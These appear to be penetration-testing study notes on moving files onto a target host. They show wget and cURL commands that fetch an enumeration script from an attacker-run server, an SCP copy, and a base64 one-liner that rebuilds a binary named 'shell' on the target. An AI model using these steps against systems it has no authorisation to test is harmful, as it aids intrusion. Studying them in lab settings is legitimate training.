# Transferring Files

File transfer is a common practice in the world of pentesting as you will need to send files to the machine you are attacking, as well as importing files from this target.

#### wget

#wget or #cURL are common tools for moving files between a target and the host you are attacking from. We can use our machine as a python server that the target will download malicious files from via cURL or wget.

To change directory and start a python server to begin listening on port 8000:

>cd /tmp
>python3 -m http.server 8000

Now we can download the file onto the target:

>wget \http://10.10.14.1:8000/linenum.sh

#### cURL

Alternatively we can use cURL using -o flag to denote the output file:

>curl http://10.10.14.1:8000/linenum.sh -o linenum.sh

#### SCP

Another means of file transfer is Secure Copy ( #SCP):

>scp linenum.sh user@remotehost:/tmp/linenum.sh

#### Base64

If we are unable to directly transfer files, we can encode the file on our machine before transferring it and decode it on the target machine using base64 encoding.

In the example given, they choose to encode a file named 'shell' with the following command:

>base64 shell -w 0

Now we can take the encoded file name and decode it on the target machine with the following command:

>echo f0VMRgIBAQAAAAAAAAAAAAIAPgABAAAA... \<SNIP> ...lIuy9iaW4vc2gAU0iJ51JXSInmDwU | base64 -d > shell

#### Validating Files

We can validate a file format for the file 'shell' with the following command:

>file shell

We can also reveal the md5 hash to ensure that our file was not modified during transfer:

>md5sum shell

This will reveal a hash associated with a file, which we can then compare to the hash of the file on the target machine:

>md5sum shell

If the results are the same for this command on both machines, we have successfully transferred the files.